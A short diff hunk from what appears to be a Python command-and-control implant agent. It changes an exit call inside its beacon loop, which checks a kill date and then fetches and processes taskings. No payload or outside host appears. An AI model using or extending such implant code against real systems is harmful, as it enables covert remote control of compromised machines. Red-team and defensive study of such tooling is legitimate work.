@@ -225,7 +225,7 @@ CRYPTO_HERE
             else:
                 while(True):
                     if self.passedKilldate():
-                        self.exit()
+                        self.exit(None)
                     try:
                         self.getTaskings()
                         self.processTaskings()
